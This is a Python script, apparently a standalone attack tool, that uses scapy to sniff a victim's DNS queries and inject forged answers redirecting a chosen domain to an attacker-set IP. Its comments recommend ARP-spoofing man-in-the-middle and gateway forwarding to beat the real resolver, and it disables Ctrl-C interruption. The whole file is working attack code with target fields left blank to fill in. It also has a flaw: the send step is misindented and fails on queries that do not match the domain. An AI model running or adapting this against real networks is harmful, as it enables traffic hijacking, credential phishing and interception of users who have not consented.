from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.l2 import get_if_addr
from scapy.all import send, sniff, conf
import signal
import ipaddress

# This script will use a DNS poison on the target IP. It could
# be modified to DNS poison more than only 1

# Timing: DNS queries and responses are sensitive to timing.
# If the spoofed response arrives after the legitimate DNS response, it may be ignored.
# Running the script on a high-performance setup or using a preconfigured MITM setup
# (e.g., ARP spoofing) can help improve timing reliability.

# Employ the MitM to improve the timing reliability. Also as an extra add can be
# to have your machine be used as a Gateway by allowing IP forwarding

ATTACKER_IP=""
VICTIM_IP=""
SPOOF_DOMAIN=""  ## Global holder to set the target domain to redirect resolv from
SPOOF_IP=""  ## Global holder to set the IP to redirect to, preferably a decoy host

def is_valid_ip(target):
  try:
    ipaddress.ip_address(target)
    return True
  except ValueError:
    return False

def process_packet(packet):
  # This condition could be changed to allow all but our machine's IP if we want to poison more
  # Safeguard the poison for our own machine
  if packet[IP].src == VICTIM_IP and packet[IP].src != ATTACKER_IP:
  # Check if the packet is a DNS query
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
      dns_query = packet[DNSQR].qname.decode()
      print(f"Intercepted DNS request for: {dns_query}")

      # Check if the query matches the target domain
      if SPOOF_DOMAIN in dns_query:
        # Craft a spoofed DNS response
        spoofed_packet = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                            UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                            DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                                an=DNSRR(rrname=dns_query, ttl=10, rdata=SPOOF_IP))

      # Send the spoofed packet
        send(spoofed_packet, verbose=0)
        print(f"Sent spoofed response: {dns_query} -> {SPOOF_IP}")

def main(in_victim_ip, in_spoof_domain, in_spoof_ip):
  global ATTACKER_IP
  global VICTIM_IP
  global SPOOF_DOMAIN
  global SPOOF_IP

  ## Can become issues perhaps if we have both IPv4 and IPv6

  ATTACKER_IP = get_if_addr(conf.iface)
  VICTIM_IP = in_victim_ip
  SPOOF_DOMAIN = in_spoof_domain
  SPOOF_IP = in_spoof_ip
  # Sniff DNS requests and apply the process_packet function
  ## Oh boy ...
  signal.signal(signal.SIGINT, signal.SIG_IGN)
  print(f"Starting DNS poisoning on domain: {SPOOF_DOMAIN}")
  sniff(filter="udp port 53", prn=process_packet)

if __name__ == "__main__":
    main(in_victim_ip="", in_spoof_domain="", in_spoof_ip="")